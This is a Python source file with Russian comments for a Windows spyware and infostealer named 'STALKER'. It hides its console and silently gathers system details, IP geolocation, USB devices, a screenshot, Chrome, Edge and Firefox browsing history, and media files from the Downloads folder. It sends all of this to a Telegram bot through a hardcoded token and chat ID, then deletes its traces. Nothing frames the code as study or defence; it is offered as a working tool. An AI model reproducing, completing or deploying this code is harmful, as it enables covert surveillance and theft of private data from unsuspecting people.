import os
import sys
import platform
import socket
import subprocess
import ctypes
import winreg
import datetime
import requests
import zipfile
import time
import traceback
import glob
import sqlite3
import shutil
import json
from io import BytesIO
from PIL import ImageGrab

# Автоматическое определение пути
if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Настройки
BOT_TOKEN = "8344514345:AAErv7P-A7i5gXj_h8F6Gn3-gN3AAELywN4"
CHAT_ID = "-4676787945"
MEDIA_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', 
                   '.mp4', '.avi', '.mov', '.mkv', 
                   '.mp3', '.wav', '.flac', '.ogg']
MAX_ARCHIVE_SIZE = 45 * 1024 * 1024  # 45 MB (увеличили размер)
LOG_PATH = os.path.join(SCRIPT_DIR, "stalker_log.txt")
HISTORY_FILE = os.path.join(SCRIPT_DIR, "browser_history.txt")
BROWSERS = {
    'Chrome': {
        'path': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History'),
        'query': "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
    },
    'Firefox': {
        'path': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
        'query': "SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100"
    },
    'Edge': {
        'path': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
        'query': "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
    }
}

def log(message):
    """Логирование в файл"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

def install_package(package):
    """Установка необходимых пакетов"""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package], 
                              creationflags=subprocess.CREATE_NO_WINDOW)
        log(f"Установлен пакет: {package}")
        return True
    except:
        log(f"Ошибка установки {package}")
        return False

# Попытка импорта Pillow
try:
    from PIL import ImageGrab
    PILLOW_INSTALLED = True
    log("Pillow успешно импортирован")
except ImportError:
    log("Pillow не установлен, пробую установить...")
    if install_package("pillow"):
        try:
            from PIL import ImageGrab
            PILLOW_INSTALLED = True
            log("Pillow успешно установлен")
        except:
            PILLOW_INSTALLED = False
            log("Не удалось импортировать Pillow")
    else:
        PILLOW_INSTALLED = False

def get_location_by_ip():
    """Получает приблизительное местоположение по IP-адресу"""
    try:
        # Получаем внешний IP-адрес
        ip_response = requests.get('https://api.ipify.org', timeout=10)
        if ip_response.status_code != 200:
            return "Не удалось получить IP"
        
        ip_address = ip_response.text
        log(f"Внешний IP-адрес: {ip_address}")
        
        # Получаем информацию о местоположении
        geo_response = requests.get(f'http://ip-api.com/json/{ip_address}?fields=status,message,country,regionName,city,isp,lat,lon,query', timeout=10)
        if geo_response.status_code != 200:
            return "Ошибка геолокации"
        
        geo_data = geo_response.json()
        
        if geo_data.get('status') == 'success':
            location_parts = []
            if geo_data.get('city'):
                location_parts.append(geo_data['city'])
            if geo_data.get('regionName'):
                location_parts.append(geo_data['regionName'])
            if geo_data.get('country'):
                location_parts.append(geo_data['country'])
            
            location = ', '.join(location_parts) if location_parts else "Не определено"
            isp = geo_data.get('isp', 'Неизвестный провайдер')
            coordinates = f"{geo_data.get('lat', '?')}, {geo_data.get('lon', '?')}"
            return f"{location}\nПровайдер: {isp}\nКоординаты: {coordinates}"
        else:
            error_msg = geo_data.get('message', 'Неизвестная ошибка')
            return f"Ошибка геолокации: {error_msg}"
    
    except Exception as e:
        log(f"Ошибка определения местоположения: {str(e)}")
        return "Ошибка определения местоположения"

def get_gpu_info():
    """Получает информацию о видеокартах"""
    try:
        if platform.system() == "Windows":
            result = subprocess.check_output(
                'wmic path win32_VideoController get name',
                shell=True,
                text=True,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            gpus = [line.strip() for line in result.split('\n') if line.strip() and line.strip() != 'Name']
            return gpus
        else:
            return ["Информация о GPU недоступна"]
    except Exception as e:
        log(f"Ошибка получения информации о GPU: {str(e)}")
        return ["Не удалось определить видеокарту"]

def get_system_info():
    info = {}
    try:
        info['Компьютер'] = platform.node()
        info['Пользователь'] = os.getlogin()
        info['ОС'] = f"{platform.system()} {platform.release()}"
        info['Архитектура'] = platform.architecture()[0]
        
        # Процессор
        try:
            cpu_info = subprocess.check_output(
                'wmic cpu get name', 
                shell=True,
                text=True,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            ).strip().split('\n')[2]
            info['Процессор'] = cpu_info
        except:
            info['Процессор'] = "Не определен"
        
        # Видеокарта
        gpu_info = get_gpu_info()
        info['Видеокарта'] = ', '.join(gpu_info) if gpu_info else "Не определено"
        
        # Память
        try:
            mem_bytes = ctypes.c_ulonglong()
            ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem_bytes))
            ram_gb = round(mem_bytes.value / (1024**2), 1)
            info['Оперативная память'] = f"{ram_gb} GB"
        except:
            info['Оперативная память'] = "Не доступно"
        
        # Диск
        try:
            free_bytes = ctypes.c_ulonglong()
            total_bytes = ctypes.c_ulonglong()
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                ctypes.c_wchar_p('C:\\'), 
                None, 
                ctypes.pointer(total_bytes), 
                ctypes.pointer(free_bytes)
            )
            disk_gb = round(total_bytes.value / (1024**3), 1)
            info['Дисковое пространство'] = f"{disk_gb} GB"
        except:
            info['Дисковое пространство'] = "Не доступно"
        
        # IP-адрес
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['Локальный IP'] = s.getsockname()[0]
            s.close()
        except:
            info['Локальный IP'] = "Не доступен"
        
        # Добавляем информацию о местоположении
        info['Местоположение'] = get_location_by_ip()
        
        info['Время запуска'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
    except Exception as e:
        log(f"Ошибка в get_system_info: {str(e)}")
        info = {"Ошибка": "Не удалось собрать информацию"}
    
    return info

def get_connected_devices():
    """Получает ТОЛЬКО СЕЙЧАС ПОДКЛЮЧЕННЫЕ устройства"""
    devices = []
    try:
        reg_path = r"SYSTEM\CurrentControlSet\Enum\USB"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
            for i in range(winreg.QueryInfoKey(key)[0]):
                device_key_name = winreg.EnumKey(key, i)
                device_key_path = f"{reg_path}\\{device_key_name}"
                
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, device_key_path) as device_key:
                    for j in range(winreg.QueryInfoKey(device_key)[0]):
                        instance_id = winreg.EnumKey(device_key, j)
                        device_path = f"{device_key_path}\\{instance_id}"
                        
                        try:
                            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, device_path) as dev_key:
                                try:
                                    status = winreg.QueryValueEx(dev_key, "Status")[0]
                                    if status != 0x0180200:
                                        continue
                                except:
                                    continue
                                
                                try:
                                    device_name = winreg.QueryValueEx(dev_key, "FriendlyName")[0]
                                    devices.append(device_name)
                                except:
                                    try:
                                        device_name = winreg.QueryValueEx(dev_key, "DeviceDesc")[0]
                                        devices.append(device_name.split(';')[-1])
                                    except:
                                        devices.append("Неизвестное устройство")
                        except:
                            continue
    except Exception as e:
        log(f"Ошибка получения устройств: {str(e)}")
    
    return list(set(devices))

def capture_screenshot():
    if not PILLOW_INSTALLED:
        log("Pillow не установлен, скриншот невозможен")
        return None
    
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        log("Скриншот успешно создан")
        return img_byte_arr
    except Exception as e:
        log(f"Ошибка создания скриншота: {str(e)}")
        return None

def get_media_files():
    """Возвращает список медиафайлов в папке Downloads"""
    media_files = []
    try:
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        log(f"Поиск медиафайлов в: {downloads_path}")
        
        if not os.path.exists(downloads_path):
            log("Папка Downloads не найдена")
            return []
        
        # Собираем все файлы с нужными расширениями
        for extension in MEDIA_EXTENSIONS:
            pattern = os.path.join(downloads_path, f"*{extension}")
            for file_path in glob.glob(pattern, recursive=False):
                if os.path.isfile(file_path):
                    if os.path.getsize(file_path) > 10 * 1024 * 1024:
                        log(f"Пропущен большой файл: {os.path.basename(file_path)}")
                        continue
                    media_files.append(file_path)
        
        # Сортируем по дате изменения (новые первыми)
        media_files.sort(key=os.path.getmtime, reverse=True)
        log(f"Найдено {len(media_files)} медиафайлов")
        return media_files[:50]  # Ограничиваем количество
    
    except Exception as e:
        log(f"Ошибка поиска медиафайлов: {str(e)}")
        return []

def get_browser_history():
    """Собирает историю браузеров и сохраняет в файл"""
    history = []
    
    try:
        # Chrome, Edge
        for browser in ['Chrome', 'Edge']:
            try:
                history_path = BROWSERS[browser]['path']
                if not os.path.exists(history_path):
                    log(f"Файл истории {browser} не найден: {history_path}")
                    continue
                
                # Копируем файл истории, чтобы избежать блокировки
                temp_db = os.path.join(SCRIPT_DIR, f"{browser}_history_temp")
                shutil.copy2(history_path, temp_db)
                
                # Подключаемся к копии базы данных
                with sqlite3.connect(temp_db) as conn:
                    cursor = conn.cursor()
                    cursor.execute(BROWSERS[browser]['query'])
                    for row in cursor.fetchall():
                        url, title, timestamp = row
                        history.append({
                            'browser': browser,
                            'title': title,
                            'url': url,
                            'time': datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                        })
                
                os.remove(temp_db)
                log(f"История {browser} успешно собрана")
            except Exception as e:
                log(f"Ошибка сбора истории {browser}: {str(e)}")
        
        # Firefox
        try:
            firefox_path = BROWSERS['Firefox']['path']
            if os.path.exists(firefox_path):
                for profile in os.listdir(firefox_path):
                    if '.default-release' in profile or '.default' in profile:
                        history_path = os.path.join(firefox_path, profile, 'places.sqlite')
                        if not os.path.exists(history_path):
                            continue
                        
                        temp_db = os.path.join(SCRIPT_DIR, "Firefox_history_temp")
                        shutil.copy2(history_path, temp_db)
                        
                        with sqlite3.connect(temp_db) as conn:
                            cursor = conn.cursor()
                            cursor.execute(BROWSERS['Firefox']['query'])
                            for row in cursor.fetchall():
                                url, title, timestamp = row
                                if timestamp:
                                    visit_time = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=timestamp)
                                    history.append({
                                        'browser': 'Firefox',
                                        'title': title,
                                        'url': url,
                                        'time': visit_time
                                    })
                        
                        os.remove(temp_db)
                        log("История Firefox успешно собрана")
                        break
        except Exception as e:
            log(f"Ошибка сбора истории Firefox: {str(e)}")
    
    except Exception as e:
        log(f"Общая ошибка сбора истории: {str(e)}")
    
    # Сортировка по времени
    history.sort(key=lambda x: x['time'], reverse=True)
    
    # Сохраняем в файл
    try:
        with open(HISTORY_FILE, "w", encoding="utf-8") as f:
            for entry in history[:100]:  # Последние 100 записей
                f.write(f"[{entry['browser']}] {entry['time'].strftime('%Y-%m-%d %H:%M')} - {entry['title']}\n")
                f.write(f"   {entry['url']}\n\n")
        
        log(f"История сохранена в {HISTORY_FILE}")
        return True
    except Exception as e:
        log(f"Ошибка сохранения истории: {str(e)}")
        return False

def create_archive():
    """Создает архив с медиафайлами и историей браузера"""
    try:
        # Собираем историю браузера
        get_browser_history()
        
        # Собираем медиафайлы
        media_files = get_media_files()
        archive_files = []
        
        # Добавляем медиафайлы
        if media_files:
            archive_files.extend(media_files)
            log(f"Добавлено {len(media_files)} медиафайлов в архив")
        else:
            log("Медиафайлы не найдены")
        
        # Добавляем файл истории
        if os.path.exists(HISTORY_FILE):
            archive_files.append(HISTORY_FILE)
            log("Файл истории добавлен в архив")
        
        if not archive_files:
            log("Нет файлов для архива")
            return None
        
        # Создаем временный архив
        archive_path = os.path.join(SCRIPT_DIR, "stalker_data.zip")
        log(f"Создаю архив из {len(archive_files)} файлов...")
        
        total_size = 0
        added_files = []
        
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            for file_path in archive_files:
                try:
                    file_size = os.path.getsize(file_path)
                    if total_size + file_size > MAX_ARCHIVE_SIZE:
                        log(f"Пропускаем {os.path.basename(file_path)} (превышение размера архива)")
                        continue
                        
                    arcname = os.path.basename(file_path)
                    zipf.write(file_path, arcname)
                    total_size += file_size
                    added_files.append(arcname)
                    log(f"Добавлен: {arcname} ({file_size//1024} KB)")
                except Exception as e:
                    log(f"Ошибка добавления {file_path}: {str(e)}")
        
        if not added_files:
            log("Нет файлов для добавления в архив")
            if os.path.exists(archive_path):
                os.remove(archive_path)
            return None
        
        archive_size_mb = total_size / (1024 * 1024)
        log(f"Архив создан: {len(added_files)} файлов, {archive_size_mb:.2f} MB")
        return archive_path
    
    except Exception as e:
        log(f"Ошибка создания архива: {str(e)}")
        return None

def send_to_telegram():
    try:
        log("Начало отправки данных в Telegram")
        
        # 1. Собираем системную информацию
        sys_info = get_system_info()
        devices = get_connected_devices()
        
        # Форматируем сообщение
        message = "🔍 <b>STALKER FULL REPORT</b> 🔍\n\n"
        message += "🖥️ <b>Системная информация:</b>\n"
        for key, value in sys_info.items():
            message += f"  • {key}: {value}\n"
        
        message += "\n🔌 <b>Активные устройства:</b>\n"
        if devices:
            for device in devices:
                message += f"  • {device}\n"
        else:
            message += "  • Устройства не обнаружены\n"
        
        # 2. Делаем скриншот
        screenshot = capture_screenshot()
        
        # 3. Отправляем основное сообщение и запоминаем его ID
        main_message_id = None
        
        if screenshot:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {'photo': ('screenshot.png', screenshot, 'image/png')}
            data = {
                'chat_id': CHAT_ID,
                'caption': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, files=files, data=data, timeout=60)
            log(f"Сообщение со скриншотом отправлено: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                main_message_id = result.get('result', {}).get('message_id')
                log(f"ID сообщения: {main_message_id}")
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=60)
            log(f"Текстовое сообщение отправлено: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                main_message_id = result.get('result', {}).get('message_id')
                log(f"ID сообщения: {main_message_id}")
        
        if not main_message_id:
            log("Не удалось получить ID основного сообщения")
        
        # 4. Создаем и отправляем архив как ответ
        archive_path = create_archive()
        if archive_path and os.path.exists(archive_path):
            try:
                archive_size = os.path.getsize(archive_path)
                if archive_size < 50 * 1024 * 1024:  # Лимит Telegram
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    with open(archive_path, 'rb') as file:
                        files = {'document': ('STALKER_Data.zip', file)}
                        data = {'chat_id': CHAT_ID}
                        
                        if main_message_id:
                            data['reply_to_message_id'] = main_message_id
                            log(f"Отправляю архив как ответ на сообщение {main_message_id}")
                        
                        response = requests.post(url, files=files, data=data, timeout=300)
                        log(f"Архив отправлен: {response.status_code}")
                else:
                    log(f"Архив слишком большой для отправки ({archive_size//1024//1024} MB > 50 MB)")
            except Exception as e:
                log(f"Ошибка отправки архива: {str(e)}")
            finally:
                try:
                    os.remove(archive_path)
                    log("Временный архив удален")
                    # Удаляем временный файл истории
                    if os.path.exists(HISTORY_FILE):
                        os.remove(HISTORY_FILE)
                except:
                    pass
        else:
            log("Архив не создан, пропуск отправки")
        
        return True
    
    except Exception as e:
        log(f"Ошибка в send_to_telegram: {str(e)}\n{traceback.format_exc()}")
        return False

def main():
    # Создаем лог-файл
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        f.write(f"STALKER Monitor - Запуск {datetime.datetime.now()}\n")
    
    log("\n" + "="*50)
    log("ЗАПУСК СИСТЕМЫ STALKER")
    log(f"Время запуска: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log(f"Рабочая папка: {SCRIPT_DIR}")
    log("="*50)
    
    try:
        # Проверка интернета
        try:
            requests.get("https://google.com", timeout=10)
            log("✓ Интернет доступен")
        except:
            log("✗ Нет интернета")
            return
        
        # Отправка данных
        start_time = time.time()
        if send_to_telegram():
            elapsed = time.time() - start_time
            log(f"✓ Данные отправлены за {elapsed:.1f} сек")
        else:
            log("✗ Ошибка отправки")
    
    except Exception as e:
        log(f"✗ Критическая ошибка: {str(e)}")
    
    log("\n" + "="*50)
    log("РАБОТА ЗАВЕРШЕНА")
    log("="*50)

if __name__ == "__main__":
    # Скрываем консоль при запуске из EXE
    if getattr(sys, 'frozen', False) and platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    main()
    
    # Закрываем приложение после выполнения
    sys.exit(0)